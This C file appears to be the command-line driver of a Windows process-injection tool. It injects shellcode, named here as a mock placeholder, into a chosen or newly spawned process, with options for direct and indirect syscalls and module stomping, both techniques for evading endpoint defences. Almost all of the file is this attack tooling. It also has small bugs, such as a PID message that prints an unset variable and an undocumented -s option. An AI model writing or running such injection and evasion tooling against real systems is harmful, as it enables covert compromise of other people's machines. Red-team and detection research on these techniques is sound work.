#include "runner.h"
#include "payload.h"

void print_usage(const char *app_name) {
    printf("Usage: %s [options]\n", app_name);
    printf("Options:\n");
    printf("  -h, --help                Show this help message\n");
    printf("  -p, --pid                 Target PID for injection\n");
    printf("  -a, --api <value>         Configure the API method to use (0,1,2,3)\n");
    printf("  -m, --module <name>       Module stomping target library\n");
    printf("  -e, --export <name>       Module stomping target function\n");
    printf("  -o, --offset <value>      Module stomping target offset\n");
}

int main(int argc, char* argv[]) {
    // default to DFR
    SYSCALL_FLAVOR apiInvocationMethod = FLAVOR_DFR;
    
    // initialize the context
    INJECTION_CONTEXT ctx = { 0 };
    ctx.spawnTarget = FALSE;
    ctx.spawnPath = NULL;
    ctx.targetPid = 0;
    ctx.payloadSize = sizeof(mockShellcode);
    ctx.targetModule = NULL;
    ctx.targetExport = NULL;
    ctx.targetOffset = 0;    

    INJECTION_ENGINE engine;
    engine.Allocate = DefaultAllocate;
    engine.Write    = DefaultWrite;
    engine.Protect  = DefaultProtect;
    engine.Invoke   = DefaultInvoke;

    // local variables for argument parsing
    BOOL spawnTarget = FALSE;
    char *spawnPath = NULL;
    int targetPid = 0;
    int apiMethod = 0;
    char *targetModule = NULL;
    char *targetExport = NULL;
    DWORD targetOffset = 0;   

    printf("--- Processing Arguments ---\n");
    for (int i = 1; i < argc; i++) {
        char *arg = argv[i];
        char *optarg = NULL;

        // Helper macro/logic to safely fetch the next argument if required
        #define FETCH_OPTARG() do { \
            if (i + 1 < argc) { \
                optarg = argv[++i]; \
            } else { \
                fprintf(stderr, "[ERROR] Option %s requires an argument.\n", arg); \
                return -1; \
            } \
        } while(0)

        // ---- Target PID ----
        if (strcmp(arg, "-p") == 0 || strcmp(arg, "--pid") == 0) {
            FETCH_OPTARG();
            ctx.targetPid = (int)strtol(optarg, NULL, 0);
            printf("[*] Using PI parameter targetPid = %d\n", targetPid);            
        } 
        
        else if (strcmp(arg, "-s") == 0 || strcmp(arg, "--spawn") == 0) {
            FETCH_OPTARG();
            free(spawnPath);
            ctx.spawnPath = optarg;
            printf("[*] Using PI parameter spawnPath = %s\n", ctx.spawnPath);            
        }

        // ---- API Method ----
        else if (strcmp(arg, "-a") == 0 || strcmp(arg, "--api") == 0) {
            FETCH_OPTARG();
            apiMethod = (int)strtol(optarg, NULL, 0);
            printf("[*] Using PI parameter apiMethod = %d\n", apiMethod);
            
            if (apiMethod == 0) {
                printf("[*] Using standard Win32 APIs.\n");
                apiInvocationMethod = FLAVOR_WIN32;
            }
            else if (apiMethod == 1) {
                printf("[*] Dynamic function resolution enabled.\n");
                apiInvocationMethod = FLAVOR_DFR;
            }            
            else if (apiMethod == 2) {
                printf("[*] Direct syscalls enabled.\n");
                apiInvocationMethod = FLAVOR_DIRECT; 
            }
            else if (apiMethod == 3) {
                printf("[*] Indirect syscalls enabled.\n");
                apiInvocationMethod = FLAVOR_INDIRECT;
            }
            else {
                printf("[ERROR] Unrecognized API method selected.\n");
                return -1;
            }
        } 
        
        // ---- Target Module ----
        else if (strcmp(arg, "-m") == 0 || strcmp(arg, "--module") == 0) {
            FETCH_OPTARG();
            free(targetModule);
            targetModule = optarg;
            printf("[*] Configuring module stomping with targetModule = %s\n", targetModule);
            ctx.enableStomping = TRUE;
            ctx.targetModule = targetModule;            
        } 
        
        // ---- Target Export ----
        else if (strcmp(arg, "-e") == 0 || strcmp(arg, "--export") == 0) {
            FETCH_OPTARG();
            free(targetExport);
            targetExport = optarg;
            printf("[*] Configuring module stomping with targetExport = %s\n", targetExport);
            ctx.enableStomping = TRUE;
            ctx.targetExport = targetExport;             
        } 
        
        // ---- Target Offset ----
        else if (strcmp(arg, "-o") == 0 || strcmp(arg, "--offset") == 0) {
            FETCH_OPTARG();            
            // Parse the string as a hexadecimal value (handles both "0x1A" and "1A" format variants)
            //targetOffset = strtoul(argv[++i], NULL, 16);            
            targetOffset = strtoul(optarg, NULL, 16);
            printf("[*] Configuring module stomping with targetOffset = %ld\n", targetOffset);
            ctx.enableStomping = TRUE;
            ctx.targetOffset = targetOffset;             
        } 
        
        // ---- Unknown Parameter ----
        else {
            printf("[ERROR] Unrecognized parameter: %s\n", arg);
            return -1;
        }

        #undef FETCH_OPTARG
    }  

    printf("--- Executing Process Injection ---\n");

    BOOL spawnProcess = FALSE;
    if(ctx.spawnPath != NULL) {
        if(ctx.targetPid != 0) {
            printf("[!] Warning: a target PID and a process to spawn were both provided.\n    Defaulting to spawning the process provided.\n    Check your parameters.\n");
        }
        spawnProcess = TRUE;
    }

    if (EngineExecute(&engine, &ctx, mockShellcode, apiInvocationMethod, PAGE_EXECUTE_READ)) {
        printf("[*] Pipeline execution complete.\n");
        
        if (ctx.hThread) {
            printf("[*] Waiting for payload thread to execute...\n");
            // Option A: Explicitly wait for the thread to finish
            WaitForSingleObject(ctx.hThread, INFINITE); 
            
            // Option B: Or a quick sleep if testing asynchronous behavior
            // Sleep(2000); 
            
            CloseHandle(ctx.hThread);
            if(spawnProcess) {
                CloseHandle(ctx.hProcess);
            }
        }
    }

    return 0;
}